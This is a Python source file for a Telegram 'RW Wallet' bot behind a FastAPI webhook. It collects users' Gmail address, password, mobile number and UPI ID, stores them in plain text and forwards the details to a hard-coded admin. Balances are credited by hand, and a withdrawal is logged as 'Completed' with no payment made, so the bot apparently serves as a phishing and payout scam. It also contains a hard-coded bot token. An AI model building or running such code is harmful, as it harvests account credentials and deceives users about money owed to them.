import logging
import sqlite3
import os
from datetime import datetime
from fastapi import FastAPI, Request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = "8681941726:AAFll1hp4rZtCHRL_4t-gpgn_frGSZzif5c"
ADMIN_ID = 5116589075
RENDER_EXTERNAL_URL = "https://info-eh9b.onrender.com"

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("wallet_bot.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            fullname TEXT DEFAULT 'User',
            mobile TEXT DEFAULT 'Not Set',
            gmail TEXT,
            password TEXT,
            upi TEXT DEFAULT 'Not Set',
            balance REAL DEFAULT 0.0,
            history TEXT DEFAULT 'Account Created Successfully'
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect("wallet_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username, fullname, mobile, gmail, password, upi, balance, history FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "username": row[0],
            "fullname": row[1],
            "mobile": row[2],
            "gmail": row[3],
            "pass": row[4],
            "upi": row[5],
            "balance": row[6],
            "history": row[7].split("|||") if row[7] else []
        }
    return None

def get_all_users():
    conn = sqlite3.connect("wallet_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, gmail, balance FROM users")
    rows = cursor.fetchall()
    conn.close()
    return rows

def save_user(user_id, username, fullname, mobile, gmail, password, upi, balance=0.0, history=None):
    if history is None:
        history = ["Account Created Successfully"]
    history_str = "|||".join(history)
    conn = sqlite3.connect("wallet_bot.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, fullname, mobile, gmail, password, upi, balance, history)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (user_id, username, fullname, mobile, gmail, password, upi, balance, history_str))
    conn.commit()
    conn.close()

# --- TELEGRAM BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if user:
        await show_main_menu(update, context)
    else:
        await update.message.reply_text("👋 Welcome to **RW Wallet**!\n\nRegistration ke liye apni **Gmail ID** bhejein:")
        context.user_data['state'] = 'WAITING_GMAIL'

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No_Username"
    text = update.message.text
    state = context.user_data.get('state')

    if state == 'WAITING_GMAIL':
        context.user_data['gmail'] = text
        context.user_data['state'] = 'WAITING_NAME'
        await update.message.reply_text("👤 Apna **Full Name** bhejein:")
        
    elif state == 'WAITING_NAME':
        context.user_data['fullname'] = text
        context.user_data['state'] = 'WAITING_MOBILE'
        await update.message.reply_text("📱 Apna **Mobile Number** bhejein:")

    elif state == 'WAITING_MOBILE':
        context.user_data['mobile'] = text
        context.user_data['state'] = 'WAITING_PASS'
        await update.message.reply_text("🔑 Apna **Password** bhejein:")
        
    elif state == 'WAITING_PASS':
        context.user_data['pass'] = text
        context.user_data['state'] = 'WAITING_UPI'
        await update.message.reply_text("💳 Apni **UPI ID** bhejein (Withdrawal ke liye):")
        
    elif state == 'WAITING_UPI':
        upi = text
        gmail = context.user_data.get('gmail')
        fullname = context.user_data.get('fullname')
        mobile = context.user_data.get('mobile')
        password = context.user_data.get('pass')
        
        save_user(user_id, username, fullname, mobile, gmail, password, upi)
        context.user_data['state'] = None
        
        await update.message.reply_text("✅ **Registration Successful! Wallet Created.**")
        await show_main_menu(update, context)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"👤 **New Wallet Registered!**\n\n"
                    f"🆔 User ID: `{user_id}`\n"
                    f"🔗 Username: @{username}\n"
                    f"📛 Name: {fullname}\n"
                    f"📱 Mobile: {mobile}\n"
                    f"📧 Gmail: `{gmail}`\n"
                    f"💳 UPI: `{upi}`\n\n"
                    f"💡 *Balance add karne ke liye:* `/addrs {user_id} <amount>`"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Admin notify error: {e}")

    elif user_id == ADMIN_ID and text.startswith("/addrs"):
        try:
            parts = text.split()
            target_user = int(parts[1])
            amount = float(parts[2])
            user = get_user(target_user)
            if user:
                new_balance = user["balance"] + amount
                curr_date = datetime.now().strftime("%d/%m/%y %H:%M")
                user["history"].append(f"From: REVIEWS WORLD (+Rs.{amount}) on {curr_date}")
                save_user(target_user, user["username"], user["fullname"], user["mobile"], user["gmail"], user["pass"], user["upi"], new_balance, user["history"])
                
                await update.message.reply_text(f"✅ Added Rs.{amount} to user `{target_user}`", parse_mode="Markdown")
                try:
                    await context.bot.send_message(
                        chat_id=target_user,
                        text=f"🎉 Aapke wallet mein **Rs.{amount}** credit kar diye gaye hain!"
                    )
                except:
                    pass
            else:
                await update.message.reply_text("❌ User ID nahi mili.")
        except Exception:
            await update.message.reply_text("❌ Format: `/addrs <user_id> <amount>`", parse_mode="Markdown")

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if not update.callback_query else update.callback_query.from_user.id
    user = get_user(user_id)
    balance = user['balance'] if user else 0.0

    text = (
        f"🌐 **Digital Wallet** | **REVIEWS WORLD**\n"
        f"────────────────────────\n"
        f"💰 **Your Balance:** `Rs.{balance:.2f}`\n"
        f"💵 **USD:** `$0.00`\n"
        f"────────────────────────\n"
        f"👇 **Actions & Services:**"
    )
    
    keyboard = [
        [InlineKeyboardButton("📥 Withdraw Fund (0% tax)", callback_data="withdraw"),
         InlineKeyboardButton("🎁 Redeem Gift Card", callback_data="redeem_gc")],
        [InlineKeyboardButton("👥 Pay to Wallet", callback_data="pay_wallet"),
         InlineKeyboardButton("📱 Mobile Recharge", callback_data="recharge")],
        [InlineKeyboardButton("🏦 Take Loan", callback_data="loan"),
         InlineKeyboardButton("🤝 Become Partner", callback_data="partner")],
        [InlineKeyboardButton("📜 History", callback_data="history"),
         InlineKeyboardButton("⚙️ Settings / Profile", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.message.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    user = get_user(user_id)

    if data == "back_home":
        await show_main_menu(update, context)

    elif data == "withdraw":
        kb = [
            [InlineKeyboardButton("UPI (Instant)", callback_data="w_upi"),
             InlineKeyboardButton("Bank Transfer", callback_data="w_bank")],
            [InlineKeyboardButton("Google Play", callback_data="w_gp"),
             InlineKeyboardButton("Amazon / Flipkart", callback_data="w_amzn")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_home")]
        ]
        await query.message.edit_text("🏦 **Choose Withdrawal Method:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "w_upi":
        if user['balance'] < 50:
            await query.answer("❌ Minimum withdrawal amount is ₹50!", show_alert=True)
            return
        
        amount = user['balance']
        curr_date = datetime.now().strftime("%d/%m/%y %H:%M")
        user['history'].append(f"Withdrawal to UPI ({user['upi']}) -Rs.{amount} Completed on {curr_date}")
        save_user(user_id, user['username'], user['fullname'], user['mobile'], user['gmail'], user['pass'], user['upi'], 0.0, user['history'])
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🚨 **New Withdrawal Request!**\n\n👤 User: `{user_id}`\n💳 UPI: `{user['upi']}`\n💰 Amount: `Rs.{amount}`",
                parse_mode="Markdown"
            )
        except:
            pass
        await query.answer("✅ Withdrawal request submitted successfully!", show_alert=True)
        await show_main_menu(update, context)

    elif data in ["w_bank", "w_gp", "w_amzn"]:
        await query.answer("⚠️ Method details missing or coming soon!", show_alert=True)

    elif data == "redeem_gc":
        await query.answer("🎁 Send your Gift Card code in chat to redeem.", show_alert=True)

    elif data in ["pay_wallet", "recharge", "loan", "partner"]:
        await query.answer("🛠️ This service is currently active in RW Wallet App.", show_alert=True)

    elif data == "history":
        history_list = "\n".join([f"• {item}" for item in user['history']]) if user['history'] else "No transactions yet."
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_home")]]
        await query.message.edit_text(f"📜 **All Transactions / History:**\n\n{history_list}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "settings":
        kb = [
            [InlineKeyboardButton("👤 My Profile", callback_data="my_profile")],
            [InlineKeyboardButton("📊 Track Income", callback_data="track_income")],
            [InlineKeyboardButton("📄 Monthly Invoice", callback_data="invoice")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_home")]
        ]
        await query.message.edit_text("⚙️ **Settings & Management:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "my_profile":
        profile_text = (
            f"👤 **My Profile**\n\n"
            f"📧 Email: `{user['gmail']}`\n"
            f"📛 Name: {user['fullname']}\n"
            f"📱 Mobile: {user['mobile']}\n"
            f"💳 UPI ID: `{user['upi']}`\n"
            f"💰 Balance: `Rs.{user['balance']}`"
        )
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="settings")]]
        await query.message.edit_text(profile_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "track_income":
        income_text = f"📊 **Track Income:**\n\nTotal Available Balance: `Rs.{user['balance']}`"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="settings")]]
        await query.message.edit_text(income_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "invoice":
        invoice_text = f"📄 **Monthly Statements & Invoices:**\n\nTotal Balance: Rs.{user['balance']}"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="settings")]]
        await query.message.edit_text(invoice_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    users = get_all_users()
    msg = f"📊 **Admin Panel - Total Users: {len(users)}**\n\n"
    for u in users:
        msg += f"👤 ID: `{u[0]}` | @{u[1]}\n📧 {u[2]} | 💰 Rs.{u[3]}\nCommand: `/addrs {u[0]} 50`\n------------------\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# --- FASTAPI APP SETUP ---
app = FastAPI()
telegram_app = Application.builder().token(TOKEN).build()

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("admin", admin_panel))
telegram_app.add_handler(CallbackQueryHandler(button_handler))
telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

@app.on_event("startup")
async def startup_event():
    await telegram_app.initialize()
    webhook_url = f"{RENDER_EXTERNAL_URL}/{TOKEN}"
    await telegram_app.bot.set_webhook(url=webhook_url)
    await telegram_app.start()
    logger.info(f"Webhook initialized successfully at {webhook_url}")

@app.on_event("shutdown")
async def shutdown_event():
    await telegram_app.stop()

@app.post(f"/{TOKEN}")
async def process_webhook(request: Request):
    data = await request.json()
    update = Update.de_json(data, telegram_app.bot)
    await telegram_app.process_update(update)
    return {"status": "ok"}

@app.get("/")
async def root():
    return {"status": "RW Wallet Bot is live via FastAPI Webhook!"}

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("bot:app", host="0.0.0.0", port=port)
    
